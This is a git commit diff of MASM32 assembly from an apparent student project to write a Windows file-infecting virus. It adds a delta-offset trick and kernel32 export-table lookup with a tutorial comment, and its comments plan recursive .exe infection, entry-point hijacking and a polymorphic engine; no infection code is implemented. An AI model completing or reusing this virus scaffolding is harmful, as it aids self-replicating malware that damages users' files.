5aa38fc0a91841e06def64489bd9adf5ee26ba58
HAX OR <HAX@HAX.org>
2012-10-28 13:01:36 -0700

    delta offset hax
    TUTORIAL section for marc hax.

--- TP0/donothing.asm
+++ TP0/donothing.asm
@@ -19,16 +19,8 @@ option casemap :none
     includelib \masm32\lib\kernel32.lib
 
 .data
-    ; Mettre ca a la fin (decommenter)
-    ; + liste d'API -> load their address en memoire
+; No data here please, put it at the end of the .code section
 
-    WndTextOut1 db  "Address: 0x"
-    WndTextOut2 db  8 dup (66), 13, 10
-    WndTextFmt  db  "%08x",0
-    Error       db  "Error",0
-    NewLine     db  "  ",0
-    exportName  db  "ExitProcess",0
- 
 .code
 
 start:  
@@ -49,78 +41,75 @@ find_PE:
     cmp     word ptr [edi],"EP" ; double check with the "PE" magic
     jne     exit_fail
 
+
 ; DELTA OFFSET to retrieve any variable address
-    ;call deltaoffset
-;deltaoffset:
-    ;pop ebp ; put EIP in ebp
+    call deltaoffset
+deltaoffset:
+    pop ebp ; put EIP in ebp
+    
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; TUTORIAL: how to use function and data
+; Call a kernel32 routine:
+; Important: ebp, esi and edi are needed each time, keep them safe ;)
+; STEP 1 -> create routine_b at the end of the file
+; STEP 2 -> use delta offset to get it's address
+; mov     eax,ebp ; EBP -> real address of delta offset
+; add     eax,offset ExitProcess_b
+; sub     eax,offset deltaoffset
+; STEP 3 -> call ent_get_function_addr with "routine"
+; push    eax
+; push    edi ; PE header
+; push    esi ; DOS header
+; call    ent_get_function_addr
+; STEP 4 -> push args && call the function
+; push    2
+; call    eax ; will call ExitProcess with exitval = 2
+; STEP 5 -> verify with echo %errorlevel% it should print 2 in this case
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-; Example how to retrieve address of Error variable
-    ;mov eax,ebp
-    ;add eax,offset Error
-    ;sub eax,offset deltaoffset
+    ; TODO: foreach file in current dir
+    
+    ; TODO: routine to open a file and 
+    ; si ya la place pour une nouvelle section, la creer
+    ; et modifier le point d'entree pour pointer dessus
+    ; retourne le point d'entree precedent
+    ; puis fait un seek() sur file a l'endroit ou le nouveau
+    ; code ira
+    ; OU retourner NULL
 
-; IMPORTANT: NE JAMAIS PLUS FAIRE DE call si on veut utiliser cette methode
-; Ou alors passer EBP en parametre car c'est la base absolue pour retrouver
-; nos adresses de variables
+    ; TODO: si retourne NULL, pour le moment, on annule
+    ; et passe a la suite
+    ; sinon, writefile le code malveillant 
 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; MARC: Le code ci-dessus doit etre execute imperativement
-; au niveau du point d'entree du programme (start) car il recupere des 
-; valeurs push-ed sur la stack par KERNEL32 avant de donner la main a notre
-; point d'entree, on utilise ca pour remonter dans son address space et 
-; faire joujou.
-; Le code ci-dessous utilise les valeurs recuperees, c'est un exemple pour 
-; toi. edi et esi doivent donc etre disponible pour toi tout au long de 
-; ton code. Ce sont les offset vers les header DOS et EXE (PE) qui permettent
-; de retrouver d'autres informations de facon sure.
-; Tu as acces a toutes les fonctions de KERNEL32.dll via ma fonction
-; ent_get_function_addr, elle prend en parametre (inverser l'ordre)
-; ESI,EDI dont je t'ai parle ainsi que l'addresse d'une chaine de
-; charactere terminee par '\0', c'est le nom de la fonction que tu veux
-; appelee, une fois que tu as ca, tu lui balances tes arguments et tu 
-; fais un "call eax" puisque les valeurs de retour sont dans eax par defaut.
-;
-; Note de style, ebx,esi,edi,ebp et esp sont des registres qui ne doivent
-; pas etre modifies par une fonction, donc tu verras des push en folie 
-; dans toutes mes fonctions, je t'invite a faire de meme, ca evite de se 
-; tirer les cheveux avec des registres qui changent sans que tu le saches.
-; C'est une convention, donc les fonctions systeme doivent respecter ca,
-; dans le pire des cas, "pushad" et "popad" peuvent entourer les appels
-; afin de sauver et restorer tous les registres generiques.
-; 
-; Ce que tu dois nous rendre: des points d'entrees vers au moins une fonction
-; qui va au moins faire ce que font tous les virus: se repliquer. Ca va
-; donc te demander d'ouvrir par exemple tous les .exe en recursif dans 
-; un chemin, et ajouter ton code a une adresse precise (adrien et moi on va
-; bosser sur ca donc pars du principe que la fonction qui analyze le .exe
-; prend un FD en param et te renvoie l'offset vers la ou tu dois mettre ton 
-; code et donc decaller le code existant). Dans un premier temps si tu peux
-; juste infecter un truc, pop up une fenetre kikoo et faire ExitProcess, ca 
-; sera bien, tu verras plus tard comment decaller bien le code, en fait on fera
-; surement une fonction qui fera de la place ailleurs, on modifiera le point 
-; d'entree pour pointer sur ton code, et a la fin de ton code on fera un jump
-; pour retourner la ou il faut et continuer l'execution du truc.
-; Penses bien qu'on fera un moteur polymorphique, donc surement un truc pas tres 
-; avance qui lira tes opcodes en memoire (donc fais bien ton code de facon contigue)
-; 
-; Ce fichier actuel possede quelques fonctions output_str et output_addr pour le debug,
-; ne les utilises pas toi, utilises seulement "call eax". Elles vont disparaitre.
-;
-; Si t'as des remarques sur le design ou des suggestions contacte-moi !
-; Bon courage,
-; Ben
-;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-    push    offset exportName
-    push    edi
-    push    esi
-    call    ent_get_function_addr   ; Get the function's address in eax
-    ;Example:
-    ;push   arg1
-    ;push   arg2
-    ;call   eax
     call    exit_success
+
+
+
+
+
+; Work in progress
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;    
+; Iterate on all section headers (ebx) 
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;          
+    ;lea     ebx,[edi+SIZEOF IMAGE_NT_HEADERS]   ; address of the first IMAGE_SECTION_HEADER
+    ;mov     dx,[edi+6h]                         ; number of sections
+
+;iterate_section:
+
+    ;cmp     dx,0
+    ;jle     exit_success ; my work here is done, I have to goooo
+
+    ; get next section header's address
+    ;add     ebx,SIZEOF IMAGE_SECTION_HEADER
+    ;dec     edx
+    ;jmp     iterate_section
+
+
+
+
+
+
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; Explore the ENT (Export Name Table) of KERNEL32
@@ -210,10 +199,10 @@ ent_next_name:
     push    ecx             ; Save edx
     push    edx             ; Save edx
     ; un/comment to hide/see all the available functions
-    push    ebx
-    call    output_str
-    push    ebx
-    call    output_addr
+    ;push    ebx
+    ;call    output_str
+    ;push    ebx
+    ;call    output_addr
     push    ebx
     push    esi
     call    strcmp_
@@ -317,40 +306,6 @@ ent_function:
     pop     ebp
     ret     12
 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;    
-; Iterate on all section headers (ebx) 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;          
-    lea     ebx,[edi+SIZEOF IMAGE_NT_HEADERS]   ; address of the first IMAGE_SECTION_HEADER
-    mov     dx,[edi+6h]                         ; number of sections
-
-iterate_section:
-
-    cmp     dx,0
-    jle     exit_success ; my work here is done, I have to goooo
-
-    ; DEBUG output (optional)
-    push    ecx         ; save ecx
-    push    edx         ; save edx
-    push    ebx
-    call    output_str
-    push    ebx
-    call    output_addr
-    pop     edx         ; restore edx
-    pop     ecx         ; restore ecx
-
-    ; get next section header's address
-    add     ebx,SIZEOF IMAGE_SECTION_HEADER
-    dec     edx
-    jmp     iterate_section
-
-
-
-
-
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;; FUNCTIONS
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-
 strlen_:
     ; Set up a stack frame 
     push    ebp
@@ -420,97 +375,17 @@ strcmp_done:
     pop     ebp
     ret     8
 
-output_str:    
-    ; takes one address pushed on the stack 
-    ; and prints the string it's pointing to
 
-    ; Set up a stack frame 
-    push    ebp
-    mov     ebp,esp
-
-    ; Saves context
-    push    ebx
-    push    esi
-    push    edi
-
-    push    STD_OUTPUT_HANDLE
-    call    GetStdHandle
-    mov     ebx,eax
-
-    ; Call strlen_ (put the result in eax)
-    push    [ebp+8]
-    call    strlen_
-
-    push    NULL
-    push    NULL
-    push    eax
-    push    [ebp+8]
-    push    ebx
-    call    WriteFile    
-
-    push    NULL
-    push    NULL
-    push    2
-    push    offset NewLine
-    push    ebx
-    call    WriteFile
-
-    mov     eax,0
-
-    pop     edi
-    pop     esi
-    pop     ebx
-
-    mov     esp,ebp
-    pop     ebp
-    ret     4
-
-output_addr:
-    ; takes one address pushed on the stack 
-    ; and prints it out
-
-    ; Set up a stack frame 
-    push    ebp
-    mov     ebp,esp
-
-    ; Saves context
-    push    ebx
-    push    esi
-    push    edi
-
-    push    [ebp+8]      ; first argument: the address to output
-    push    offset WndTextFmt
-    push    offset WndTextOut2
-    call    wsprintfA   ; uses _cdecl O.o ...
-    add     esp,12      ; discard elements pushed on the stack
-
-    push    STD_OUTPUT_HANDLE
-    call    GetStdHandle
-    
-    push    NULL
-    push    NULL
-    push    SIZEOF WndTextOut1 + SIZEOF WndTextOut2
-    push    offset WndTextOut1
-    push    eax
-    call    WriteFile
-
-    mov     eax,0
-
-    pop     edi
-    pop     esi
-    pop     ebx
-
-    mov     esp,ebp
-    pop     ebp
-    ret     4
 
 exit_success:
-    push    0
-    call    ExitProcess
+    ; WIN
+    mov     eax,042h
+    call    eax
 
 exit_fail:
-    push    1
-    call    ExitProcess
+    ; For debug :D
+    mov     eax,0DEADBEEFh
+    call    eax
 
 ; All the virus data: use delta offset
 ;virus_data:
@@ -521,5 +396,10 @@ exit_fail:
     ;Error       db  "Error",0
     ;NewLine     db  "  ",0
     ;exportName  db  "ExitProcess",0
+
+    ExitProcess_b   db  "ExitProcess",0
+    ExitProcess_f   dd  0
+    Beep_b          db  "Beep",0
+    Beep_f          dd  0
 
 end start
